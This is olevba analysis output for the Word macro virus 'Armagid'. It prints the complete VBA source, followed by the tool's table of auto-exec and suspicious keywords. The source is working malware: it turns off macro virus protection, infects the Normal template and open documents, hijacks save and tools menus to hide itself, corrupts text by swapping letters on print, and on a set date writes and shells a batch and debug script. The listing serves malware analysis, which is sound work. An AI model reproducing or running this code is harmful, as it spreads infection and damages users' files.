olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Armagid-33fcf8ad4d388b02cdd99bd7d52a7cb97be4c530
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Armagid-33fcf8ad4d388b02cdd99bd7d52a7cb97be4c530 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'ARMAGIDON
On Error Resume Next
Application.ScreenUpdating = False
Application.ShowVisualBasicEditor = False
Options.VirusProtection = False
NTinf = False
ATinf = False
NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
If UCase(NI) = "'ARMAGIDON" Then NTinf = True
If UCase(AI) = "'ARMAGIDON" Then ATinf = True
If NTinf = True And ATinf = True Then GoTo 1
If NTinf = False Then
Set ND = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
End If
If ATinf = False Then
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With AD
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
End If
1: On Error GoTo armagidon
If NormalTemplate.VBProject.VBComponents("armagidon").Name = "armagidon" Then Exit Sub
armagidon:
Open "armagidon.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "armagidon" & Chr(34)
Print #1, "Sub AutoExec()"
Print #1, "Options.VirusProtection = False"
Print #1, "End Sub"
Print #1, "Sub AutoExit()"
Print #1, "Options.VirusProtection = True"
Print #1, "End Sub"
Print #1, "Sub ToolsOptions()"
Print #1, "Options.VirusProtection = True"
Print #1, "If Dialogs(wdDialogToolsOptions).Show Then"
Print #1, "End If"
Print #1, "Options.VirusProtection = False"
Print #1, "End Sub"
Print #1, "Sub ToolsMacro()"
Print #1, "End Sub"
Print #1, "Sub FileTemplates()"
Print #1, "End Sub"
Print #1, "Sub ViewVBcode()"
Print #1, "End Sub"
Print #1, "Sub Organizer()"
Print #1, "End Sub"
Print #1, "Sub ToolsRecordMacroStart()"
Print #1, "End Sub"
Print #1, "Sub ToolsRecordMacroToggle()"
Print #1, "End Sub"
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule"
Print #1, "With NormalTemplate.VBProject.VBComponents(1).CodeModule"
Print #1, "VC = .Lines(1, .CountOfLines)"
Print #1, "End With"
Print #1, "With AD"
Print #1, ".DeleteLines 1, .CountOfLines"
Print #1, ".InsertLines 1, VC"
Print #1, "End With"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Print #1, "Sub FilePrint()"
Print #1, "On Error Resume Next"
Print #1, "Application.ScreenUpdating = False"
Print #1, "If Dialogs(wdDialogFilePrint).Show = -1 Then"
Print #1, "If Int((2 * Rnd) + 1) = 1 Then"
Print #1, "With Options"
Print #1, ".CheckSpellingAsYouType = False"
Print #1, ".CheckGrammarAsYouType = False"
Print #1, "End With"
Print #1, "Selection.Find.ClearFormatting"
Print #1, "Selection.Find.Replacement.ClearFormatting"
Print #1, "With Selection.Find"
Print #1, ".Text = " & Chr(34) & "р" & Chr(34)
Print #1, ".Replacement.Text = " & Chr(34) & "л" & Chr(34)
Print #1, ".Forward = True"
Print #1, ".Wrap = wdFindContinue"
Print #1, "End With"
Print #1, "Selection.Find.Execute Replace:=wdReplaceAll"
Print #1, "Selection.HomeKey Unit:=wdStory"
Print #1, "ActiveDocument.UndoClear"
Print #1, "End If"
Print #1, "End If"
Print #1, "End Sub"
Close #1
NormalTemplate.VBProject.VBComponents.Import ("armagidon.bas")
Kill "armagidon.bas"
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_New()
On Error Resume Next
If Day(Now()) = 8 And Month(Now()) = 5 Then  'Day of Red Cross
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Cursors", "Arrow") = "C:\WINDOWS\CURSORS\Help.cur" Then GoTo 2
Open "C:\WINDOWS\CURSORS\help.scr" For Output As #1
Print #1, "N Help.CUR"
Print #1, "E 0100 00 00 02 00 01 00 20 20 10 00 00 00 00 00 E8 02"
Print #1, "E 0110 00 00 16 00 00 00 28 00 00 00 20 00 00 00 40 00"
Print #1, "E 0120 00 00 01 00 04 00 00 00 00 00 80 02 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00"
Print #1, "E 0140 00 00 00 00 80 00 00 80 00 00 00 80 80 00 80 00"
Print #1, "E 0150 00 00 80 00 80 00 80 80 00 00 C0 C0 C0 00 80 80"
Print #1, "E 0160 80 00 00 00 FF 00 00 FF 00 00 00 FF FF 00 FF 00"
Print #1, "E 0170 00 00 FF 00 FF 00 FF FF 00 00 FF FF FF 00 00 00"
Print #1, "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01C0 00 00 00 00 0F FF FF FF 00 00 00 00 00 00 00 00"
Print #1, "E 01D0 00 00 00 FF F9 99 99 99 FF F0 00 00 00 00 00 00"
Print #1, "E 01E0 00 00 0F FF F9 99 99 99 FF FF 00 00 00 00 00 00"
Print #1, "E 01F0 00 0F FF FF F9 99 99 99 FF FF FF 00 00 00 00 00"
Print #1, "E 0200 00 0F FF FF F9 99 99 99 FF FF FF 00 00 00 00 00"
Print #1, "E 0210 00 FF FF FF F9 99 99 99 FF FF FF F0 00 00 00 00"
Print #1, "E 0220 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 0230 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 0240 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 0250 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 0260 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 0270 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 0280 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 0290 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 02A0 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 02B0 F9 99 99 99 99 99 99 99 99 99 99 99 F0 00 00 00"
Print #1, "E 02C0 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 02D0 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 02E0 0F FF FF FF F9 99 99 99 FF FF FF FF 00 00 00 00"
Print #1, "E 02F0 00 FF FF FF F9 99 99 99 FF FF FF F0 00 00 00 00"
Print #1, "E 0300 00 0F FF FF F9 99 99 99 FF FF FF 00 00 00 00 00"
Print #1, "E 0310 00 0F FF FF F9 99 99 99 FF FF FF 00 00 00 00 00"
Print #1, "E 0320 00 00 0F FF F9 99 99 99 FF FF 00 00 00 00 00 00"
Print #1, "E 0330 00 00 00 FF F9 99 99 99 FF F0 00 00 00 00 00 00"
Print #1, "E 0340 00 00 00 00 0F FF FF FF 00 00 00 00 00 00 00 00"
Print #1, "E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FF"
Print #1, "E 0380 FF FF FF FF FF FF FF FF FF FF FF F8 0F FF FF C0"
Print #1, "E 0390 01 FF FF 80 00 FF FE 00 00 3F FC 00 00 1F FC 00"
Print #1, "E 03A0 00 1F F8 00 00 0F F0 00 00 07 F0 00 00 07 F0 00"
Print #1, "E 03B0 00 07 E0 00 00 03 E0 00 00 03 E0 00 00 03 E0 00"
Print #1, "E 03C0 00 03 E0 00 00 03 E0 00 00 03 E0 00 00 03 F0 00"
Print #1, "E 03D0 00 07 F0 00 00 07 F0 00 00 07 F8 00 00 0F FC 00"
Print #1, "E 03E0 00 1F FC 00 00 1F FE 00 00 3F FF 80 00 FF FF C0"
Print #1, "E 03F0 01 FF FF F8 0F FF FF FF FF FF FF FF FF FF"
Print #1, "RCX"
Print #1, "2FE"
Print #1, "w"
Print #1, "q"
Close #1
Open "C:\WINDOWS\CURSORS\help.bat" For Output As #1
Print #1, "@echo off"
Print #1, "debug < help.scr"
Close #1
ChDir "C:\WINDOWS\CURSORS\"
Shell "C:\WINDOWS\CURSORS\help.bat", 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Cursors", "Arrow") = "C:\WINDOWS\CURSORS\Help.cur"
Dim a, b, c
a = 5
b = Timer
Do While Timer < b + a
DoEvents
Loop
c = Timer
ChDir "C:\WINDOWS\CURSORS\"
Kill "C:\WINDOWS\CURSORS\help.scr"
Kill "C:\WINDOWS\CURSORS\help.bat"
End If
2:
End Sub

'   MMM            MMMMMMMMM                 MM
' MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'  MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'   MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'   MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'   MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'   MMM        MMMMMMMMMMM               MMMMMMMM
'    MM         MMMMMMMM               M  MMMMMMM
'    MM        MMMMMMMMM             MMM   MMMMMM
'             MMMMMMMMMMMMMM      MMMMM    MMMMMM
'    MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'   MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'  MMMMMMMMMM                                MM
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |help.scr            |Executable file name                         |
|IOC       |help.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

